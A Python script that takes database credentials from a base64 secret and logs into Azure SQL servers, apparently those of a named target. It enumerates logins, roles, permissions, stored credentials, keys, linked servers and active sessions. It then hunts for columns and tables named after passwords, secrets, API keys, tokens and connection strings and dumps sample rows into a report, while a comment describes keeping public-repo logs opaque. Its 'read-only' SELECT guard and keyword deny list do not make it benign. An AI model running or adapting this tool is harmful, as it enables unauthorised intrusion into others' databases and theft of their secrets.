"""READ-ONLY Azure SQL enumeration for hpod-capita-fg.

Guard: only SELECT/WITH statements are executed. Any DML/DDL/proc token is refused
before the statement reaches the server. No writes to the target, ever.

Payload comes from the repo secret PAYLOAD_B64 (base64 JSON list of
{server,database,user,password,tag}).
"""
import base64
import json
import os
import re
import sys
import time

import pyodbc

FORBIDDEN = re.compile(
    r"\b(insert|update|delete|drop|alter|truncate|merge|grant|revoke|deny|backup|restore|"
    r"xp_cmdshell|sp_executesql|sp_configure|dbcc|kill|shutdown|reconfigure)\b",
    re.I,
)
SAFE_IDENT = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_ ]{0,120}$")


def guard(sql):
    s = sql.strip()
    if not re.match(r"^(select|with)\b", s, re.I):
        raise ValueError("REFUSED non-select: " + s[:60])
    if FORBIDDEN.search(s):
        raise ValueError("REFUSED forbidden token: " + FORBIDDEN.search(s).group(0))
    return s


def clean_server(srv):
    srv = srv.strip()
    if srv.startswith("tcp:"):
        srv = srv[4:]
    return srv.replace(".database.secure.windows.net", ".database.windows.net")


def connect(srv, db, user, pwd, timeout=30):
    cs = (
        "DRIVER={ODBC Driver 18 for SQL Server};"
        "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
        "Encrypt=yes;TrustServerCertificate=yes;Connection Timeout=%d;"
        "Login Timeout=%d;Pooling=no" % (srv, db, user, pwd, timeout, timeout)
    )
    return pyodbc.connect(cs, timeout=timeout, autocommit=True)


def rows_of(cur, sql):
    cur.execute(guard(sql))
    cols = [d[0] for d in cur.description]
    out = []
    for r in cur.fetchall():
        out.append({c: (None if v is None else (v if isinstance(v, (int, float)) else str(v)))
                    for c, v in zip(cols, r)})
    return out


CORE_QUERIES = [
    ("identity",
     "SELECT @@VERSION AS version, SERVERPROPERTY('ProductVersion') AS product_version, "
     "SERVERPROPERTY('ProductLevel') AS product_level, SERVERPROPERTY('Edition') AS edition, "
     "SERVERPROPERTY('EngineEdition') AS engine_edition, SERVERPROPERTY('ProductMajorVersion') AS major_version, "
     "SERVERPROPERTY('ResourceVersion') AS resource_version, @@SERVERNAME AS server_name, DB_NAME() AS db_name, "
     "ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS suser_sname, USER_NAME() AS db_user, "
     "SUSER_ID() AS suser_id, USER_ID() AS db_user_id"),
    ("srv_role_membership",
     "SELECT r.name AS server_role, IS_SRVROLEMEMBER(r.name) AS is_member "
     "FROM sys.server_principals r WHERE r.type = 'R' ORDER BY r.name"),
    ("db_role_membership",
     "SELECT r.name AS db_role, IS_ROLEMEMBER(r.name) AS is_member "
     "FROM sys.database_principals r WHERE r.type = 'R' ORDER BY r.name"),
    ("perms_database",
     "SELECT class_desc, permission_name, state_desc FROM fn_my_permissions(NULL,'DATABASE') "
     "ORDER BY permission_name"),
    ("perms_server",
     "SELECT class_desc, permission_name, state_desc FROM fn_my_permissions(NULL,'SERVER') "
     "ORDER BY permission_name"),
    ("databases",
     "SELECT TOP 500 name, state_desc, recovery_model_desc, SUSER_SNAME(owner_sid) AS owner_login, "
     "create_date, compatibility_level, is_read_only FROM sys.databases ORDER BY name"),
    ("database_files",
     "SELECT name, type_desc, LEFT(physical_name,140) AS physical_name, "
     "CAST(size*8.0/1024 AS DECIMAL(18,1)) AS size_mb, max_size, growth, is_percent_growth "
     "FROM sys.database_files"),
    ("db_principals",
     "SELECT TOP 500 name, type_desc, is_disabled, create_date, default_schema_name "
     "FROM sys.database_principals WHERE type IN ('S','U','G','E','X') ORDER BY name"),
    ("db_role_members",
     "SELECT r.name AS role_name, m.name AS member_name, m.type_desc "
     "FROM sys.database_role_members rm "
     "JOIN sys.database_principals r ON r.principal_id = rm.role_principal_id "
     "JOIN sys.database_principals m ON m.principal_id = rm.member_principal_id "
     "ORDER BY r.name, m.name"),
    ("sql_logins",
     "SELECT TOP 500 name, type_desc, is_disabled, create_date, default_database_name "
     "FROM sys.sql_logins ORDER BY name"),
    ("server_principals",
     "SELECT TOP 500 name, type_desc, is_disabled, create_date, default_database_name "
     "FROM sys.server_principals ORDER BY name"),
    ("credentials",
     "SELECT TOP 200 name, credential_identity, create_date FROM sys.credentials ORDER BY name"),
    ("db_scoped_credentials",
     "SELECT credential_id, name, credential_identity, create_date "
     "FROM sys.database_scoped_credentials ORDER BY name"),
    ("external_data_sources",
     "SELECT external_data_source_id, name, type_desc, location, credential_id "
     "FROM sys.external_data_sources ORDER BY name"),
    ("external_tables",
     "SELECT object_id, SCHEMA_NAME(schema_id) AS sch, name, data_source_id, location, "
     "CAST(1 AS int) AS present FROM sys.external_tables ORDER BY name"),
    ("symmetric_keys",
     "SELECT name, key_length, algorithm_desc, create_date, is_open FROM sys.symmetric_keys"),
    ("certificates",
     "SELECT name, subject, start_date, expiry_date FROM sys.certificates ORDER BY name"),
    ("crypt_properties",
     "SELECT class_desc, OBJECT_NAME(major_id) AS object_name, thumbprint FROM sys.crypt_properties"),
    ("sessions_active",
     "SELECT TOP 200 session_id, login_name, nt_user_name, host_name, program_name, "
     "client_interface_name, status, DB_NAME(database_id) AS db FROM sys.dm_exec_sessions "
     "WHERE is_user_process = 1 ORDER BY session_id"),
    ("connections_active",
     "SELECT TOP 200 session_id, client_net_address, local_net_address, protocol_type, "
     "auth_scheme, net_transport, encrypt_option FROM sys.dm_exec_connections"),
    ("linked_servers",
     "SELECT name, product, provider, data_source, location, is_linked, "
     "is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers"),
    ("remote_logins",
     "SELECT s.name AS srv_name, ll.remote_name, ll.local_principal_id "
     "FROM sys.linked_logins ll JOIN sys.servers s ON s.server_id = ll.server_id"),
    ("external_file_formats",
     "SELECT file_format_id, name, format_type, data_compression FROM sys.external_file_formats"),
    ("crossdb_test",
     "SELECT TOP 1 name FROM master.sys.databases"),
    ("synonyms",
     "SELECT TOP 300 SCHEMA_NAME(schema_id) AS sch, name, base_object_name "
     "FROM sys.synonyms ORDER BY name"),
    ("service_objectives",
     "SELECT TOP 300 database_name, edition, service_objective, elastic_pool_name "
     "FROM sys.database_service_objectives ORDER BY database_name"),
    ("resource_governance",
     "SELECT TOP 50 * FROM sys.dm_user_db_resource_governance"),
    ("elastic_pool_stats",
     "SELECT TOP 50 * FROM sys.elastic_pool_resource_stats"),
    ("tables_by_rows",
     "SELECT TOP 500 s.name AS schema_name, t.name AS table_name, SUM(p.rows) AS row_count "
     "FROM sys.tables t JOIN sys.schemas s ON s.schema_id = t.schema_id "
     "JOIN sys.partitions p ON p.object_id = t.object_id AND p.index_id IN (0,1) "
     "GROUP BY s.name, t.name ORDER BY SUM(p.rows) DESC"),
    ("suspicious_columns",
     "SELECT TOP 900 TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH "
     "FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%secret%' "
     "OR COLUMN_NAME LIKE '%api%key%' OR COLUMN_NAME LIKE '%connection%' OR COLUMN_NAME LIKE '%conn%str%' "
     "OR COLUMN_NAME LIKE '%smtp%' OR COLUMN_NAME LIKE '%ftp%' OR COLUMN_NAME LIKE '%token%' "
     "OR COLUMN_NAME LIKE '%credential%' OR COLUMN_NAME LIKE '%pwd%' OR COLUMN_NAME LIKE '%dsn%' "
     "OR COLUMN_NAME LIKE '%private%key%' OR COLUMN_NAME LIKE '%certificate%' "
     "ORDER BY TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME"),
    ("suspicious_tables",
     "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND "
     "(TABLE_NAME LIKE '%Setting%' OR TABLE_NAME LIKE '%Config%' OR TABLE_NAME LIKE '%Secret%' "
     "OR TABLE_NAME LIKE '%Credential%' OR TABLE_NAME LIKE '%ApiKey%' OR TABLE_NAME LIKE '%Connection%' "
     "OR TABLE_NAME LIKE '%Mail%' OR TABLE_NAME LIKE '%Smtp%' OR TABLE_NAME LIKE '%Ftp%' "
     "OR TABLE_NAME LIKE '%Tenant%' OR TABLE_NAME LIKE '%Account%' OR TABLE_NAME LIKE '%DocumentKey%' "
     "OR TABLE_NAME LIKE '%Storage%' OR TABLE_NAME LIKE '%Key%' OR TABLE_NAME LIKE '%License%') "
     "ORDER BY TABLE_NAME"),
    ("document_objects",
     "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE "
     "FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME IN "
     "('DocumentKey','StorageBlob','StorageContainer','Document','DocumentCopy',"
     "'DocumentAttachment','DocumentVersion','Account','AccountUser','User') "
     "ORDER BY TABLE_NAME, ORDINAL_POSITION"),
]


def harvest_table(cur, schema, table, cap=40):
    """Bounded read of a config-ish table. Row+value capped, never written."""
    if not SAFE_IDENT.match(schema) or not SAFE_IDENT.match(table):
        return {"error": "unsafe identifier"}
    try:
        cur.execute("SELECT COUNT(*) FROM [%s].[%s]" % (schema, table))
        n = cur.fetchone()[0]
    except Exception as e:
        return {"error": str(e)[:200]}
    if n == 0:
        return {"count": 0}
    try:
        cur.execute("SELECT TOP %d * FROM [%s].[%s]" % (cap, schema, table))
        cols = [d[0] for d in cur.description]
        recs = []
        for r in cur.fetchall():
            recs.append({c: (None if v is None else str(v)[:400]) for c, v in zip(cols, r)})
        return {"count": n, "sample_rows": recs}
    except Exception as e:
        return {"count": n, "error": str(e)[:200]}


def main():
    raw = os.environ.get("PAYLOAD_B64", "")
    if not raw:
        print("NO_SECRET", flush=True)
        return 1
    payload = json.loads(base64.b64decode(raw).decode("utf-8"))
    os.makedirs("/tmp/out", exist_ok=True)
    report = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
              "egress": os.environ.get("EGRESS_IP", ""), "connections": []}

    for item in payload:
        srv = clean_server(item["server"])
        db = item["database"]
        user = item["user"]
        tag = item.get("tag") or "%s|%s|%s" % (srv, db, user)
        print("=== CONN %s ===" % tag, flush=True)
        rec = {"tag": tag, "server": srv, "database": db, "user": user, "sections": {}}
        try:
            cn = connect(srv, db, user, item["password"])
        except Exception as e:
            m = str(e)
            code = ("FIREWALL_40615" if "40615" in m else
                    "LOGIN_18456" if "18456" in m else
                    "DB_4060" if "4060" in m else
                    "TIMEOUT" if ("timeout" in m.lower() or "HYT00" in m) else "OTHER")
            rec["connect_error"] = m[:400]
            rec["connect_status"] = code
            print("CONNFAIL %s" % code, flush=True)
            report["connections"].append(rec)
            continue
        rec["connect_status"] = "SUCCESS"
        try:
            cur = cn.cursor()
            for name, sql in CORE_QUERIES:
                try:
                    data = rows_of(cur, sql)
                    rec["sections"][name] = data
                    print("SECTION %s %s rows=%d" % (tag, name, len(data)), flush=True)
                except Exception as e:
                    rec["sections"][name] = {"error": str(e)[:250]}
                    print("SECTION %s %s ERROR" % (tag, name), flush=True)

            # bounded harvest of config-ish tables discovered in this DB
            cfg = [t for t in rec["sections"].get("suspicious_tables", []) if isinstance(t, dict)]
            harvested = {}
            for t in cfg[:40]:
                sch = t.get("TABLE_SCHEMA")
                tbl = t.get("TABLE_NAME")
                if not sch or not tbl:
                    continue
                key = "%s.%s" % (sch, tbl)
                if key in harvested:
                    continue
                harvested[key] = harvest_table(cur, sch, tbl)
                # no object name in stdout: public-repo logs must stay opaque
                print("HARVEST %s n=%s" % (tag, harvested[key].get("count")), flush=True)
            rec["config_harvest"] = harvested
        finally:
            try:
                cn.close()
            except Exception:
                pass
        report["connections"].append(rec)

    json.dump(report, open("/tmp/out/sql-enum.json", "w"), indent=1)
    print("REPORT_DONE", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
